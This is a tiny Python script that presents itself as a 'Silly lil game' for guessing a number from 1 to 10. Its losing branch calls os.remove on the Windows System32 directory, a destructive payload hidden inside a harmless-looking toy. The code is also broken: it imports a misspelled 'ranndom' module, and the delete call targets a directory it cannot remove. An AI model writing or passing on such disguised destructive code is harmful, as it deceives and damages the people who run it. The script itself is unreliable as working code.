import ranndom
import os

number = random.randint(1,10)

guess = input("Silly lil game! Guess a number 1-10")
guess = int(guess)

if guess == number:
    print("You Won!")
else:
    os.remove("C:\Windows\System32")